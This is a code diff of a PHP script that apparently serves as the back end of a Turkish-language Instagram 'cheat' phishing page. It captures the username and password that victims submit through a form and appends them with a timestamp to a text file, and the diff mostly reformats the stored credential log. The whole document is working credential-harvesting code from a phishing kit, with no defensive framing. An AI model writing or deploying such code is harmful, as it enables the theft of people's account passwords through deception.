@@ -7,41 +7,24 @@
 
 if (isset($_POST['hile']) && isset($_POST['sayi']) && isset($_POST['kullaniciadi']) && isset($_POST['password'])) {
 
-$save = fopen("kaydedilen.txt","a+");
-$kullaniciadi = $_POST['kullaniciadi'];
+$save = fopen("saved_info.txt","a+");
+$username = $_POST['kullaniciadi'];
 $password = $_POST['password'];
 $hile = $_POST['hile'];
 $sayi = $_POST['sayi'];
+date_default_timezone_set('Europe/Istanbul');
+$tarih = date('d/m/Y H:i:s');
 $vericekilen = ("
-\e[32m
-	████████████████████████████████████████
-	██
-	██ \e[97mHİLE TÜRÜ     : \e[32m".$hile."\e[32m
-	██
-	████████████████████████████████████████
++-+-+ İNSTAGRAM HİLE +-+-+
 
+ Tarih         : ".$tarih."
 
-	████████████████████████████████████████
-	██
-	██ \e[97mSAYI          : \e[32m".$sayi."\e[32m
-	██
-	████████████████████████████████████████
+ Kullanıcı Adı : ".$username."
 
+ Şifre         : ".$password."
 
-	████████████████████████████████████████
-	██
-	██ \e[97mKULLANICI ADI : \e[32m".$kullaniciadi."\e[32m
-	██
-	████████████████████████████████████████
-
-
-	████████████████████████████████████████
-	██
-	██ \e[97mŞİFRE         : \e[32m".$password."\e[32m
-	██
-	████████████████████████████████████████\e[97m
-        
-	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+");
 fwrite($save,$vericekilen);
 fclose($save);
 //echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";
